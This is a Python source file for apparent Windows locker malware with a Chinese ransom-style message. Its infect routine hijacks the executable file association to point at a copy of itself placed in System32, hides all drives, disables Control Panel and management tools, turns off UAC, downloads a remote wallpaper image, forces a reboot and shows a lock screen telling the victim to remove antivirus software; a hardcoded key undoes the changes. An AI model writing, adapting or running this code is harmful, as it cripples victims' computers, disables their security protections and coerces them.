import sys
import os
import tkinter as tk
from tkinter import messagebox
import shutil
import time
import urllib.request
import ctypes

file_path = "C:\\readme.txt"



#UI界面
def run_encryption_dialog():
    # 创建主窗口
    window = tk.Tk()
    window.title("copyright©https://juhuon.github.io/infect/computerlock")

    # 设置背景颜色
    window.configure(bg="red")

    # 第一部分内容
    text1 = """您好，我们很抱歉的通知您——您的电脑被我们加密了。
    由于在这台电脑上发现了难以卸载、强制弹窗、开机自启占用内存的流氓软件，侵犯他人正当权利和隐私的监控终端我们暂时锁定了这台电脑。
    这也意味着它并没有损坏，你任然可以修复。
    当然，修复的办法很少，其中一个就是输入可用的密钥。
    请关闭并卸载您的杀毒软件和恢复程序，因为没有我们的服务就算上帝来了也无能为力。
    那么怎么获得密钥呢？其实很简单，你只要按我们说的做就能轻松获得：
    1.为流氓软件提供可靠的卸载程序和方法。
    2.停止对他人权利和隐私的侵犯，删除监控终端。
    3.允许你的安卓设备进入原生设置、桌面、安全模式，允许调试。
    4.可以使用邮箱注册您公司的产品账号。
    5.讯飞星火大模型不用注册也能使用。
    我们将关注您的行动，祝您早日恢复对电脑的控制。"""
    label1 = tk.Label(window, text=text1, bg="white", wraplength=500)
    label1.pack()

    # 第二部分内容
    frame2 = tk.Frame(window, bg="red")
    frame2.pack()

    label2 = tk.Label(frame2, text="在此处输入密钥", bg="red", fg="white")
    label2.pack(side="left")

    input_box = tk.Entry(frame2)
    input_box.pack(side="left")


#恢复
    def handle_button_click():
        input_text = input_box.get()
        if input_text == "WuHuNo3highschool":
            # 执行恢复操作
            fileexe = 'ftype exefile="%1" %*'
            drivesunlock = 'reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoViewOnDrive /f'
            ControlPanel = 'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /f'
            explorer ='taskkill /im explorer.exe /f & explorer'
            Snapins = 'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Microsoft\MMC" /v RestrictToPermittedSnapins /f'
            allowManage ='reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoManageMyComputerVerb /f'
            os.system(fileexe)
            os.system(drivesunlock)
            os.system(explorer)
            time.sleep(3)
            os.remove(file_path)
            os.system(ControlPanel)
            os.system(Snapins)
            os.system(allowManage)
            UAC ='reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f'
            os.system(UAC)
            messagebox.showinfo("提示", "已完成，部分功能完全恢复可能需要重启计算机。感谢您的配合！")
            sys.exit()
        else:
            # 弹窗提示密码无效
            messagebox.showinfo("提示", "密钥无效")

    button = tk.Button(window, text="确定", command=handle_button_click)
    button.pack()

    # 运行主循环
    window.mainloop()




#感染/破坏
def infect():
    exe = 'ftype exefile=C:\\Windows\\System32\\hello.exe'
    drives = 'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoViewOnDrive /t REG_DWORD /d 33554431 /f'
    explorer ='taskkill /im explorer.exe /f & explorer'
    NoControlPanel = 'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 1 /f'
    ManageMyComputer ='reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoManageMyComputerVerb /t REG_DWORD /d 1 /f'
    RestrictToPermittedSnapins = 'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Microsoft\MMC" /v RestrictToPermittedSnapins /t REG_DWORD /d 1 /f'
    os.system(exe)
    
    os.system(NoControlPanel)
    os.system(RestrictToPermittedSnapins)
    os.system(ManageMyComputer)
    # 指定文件路径和名称
    file_path = 'C:\\readme.txt'
    text = """您好，我们很抱歉的通知您——您的电脑被我们加密了。
    由于在这台电脑上发现了难以卸载、强制弹窗、开机自启占用内存的流氓软件，侵犯他人正当权利和隐私的监控终端我们暂时锁定了这台电脑。
    这也意味着它并没有损坏，你任然可以修复。
    当然，修复的办法很少，其中一个就是输入可用的密钥。
    请关闭并卸载您的杀毒软件和恢复程序，因为没有我们的服务就算上帝来了也无能为力。
    那么怎么获得密钥呢？其实很简单，你只要按我们说的做就能轻松获得：
    1.为牛氓软件提供可靠的卸载程序和方法。
    2.停止对他人权利和隐私的侵犯，删除监控终端。
    3.允许你的安卓设备进入原生设置、桌面、安全模式，允许调试。
    4.可以使用邮箱注册您公司的产品账号。
    5.讯飞星火大模型不用注册也能使用。
    我们将关注您的行动，祝您早日恢复对电脑的控制。"""
    with open(file_path, 'w') as file:
         file.write(text)
    os.system(drives)
    os.system(explorer)
    

    
    admin = 'reg add "HKCU\Software\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers" /v "C:\\Windows\\System32\\hello.exe" /t REG_SZ /d "RUNASADMIN" /f'
    os.system(admin)

    # 获取当前可执行文件的路径
    exe_file = sys.argv[0]

    target_folder = r'C:\Windows\System32'
    if not os.path.exists(target_folder):
      os.makedirs(target_folder)

    # 将当前可执行文件复制到目标文件夹中
    shutil.copy(exe_file, target_folder)
    image_url = "https://img1.imgtp.com/2023/07/08/nU3YDxCB.jpeg"
    save_path = r"C:\downloaded_image.jpeg"

    wallpaper(image_url, save_path)

    UAC ='reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f'
    os.system(UAC)
    os.system("shutdown /r /t 5")
    run_encryption_dialog()



#设置壁纸
def wallpaper(image_url, save_path):
    def download_image(url, path):
        try:
            urllib.request.urlretrieve(url, path)
        except Exception as e:
            pass
    
    def set_wallpaper(image_path):
        if not os.path.exists(image_path):
            return
        try:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
        except Exception as e:
            pass
    
    # 下载图片
    download_image(image_url, save_path)
    
    # 设置桌面壁纸
    set_wallpaper(save_path)


#执行之前创建的函数
if os.path.isfile(file_path):
    run_encryption_dialog()
else:
    infect()
    
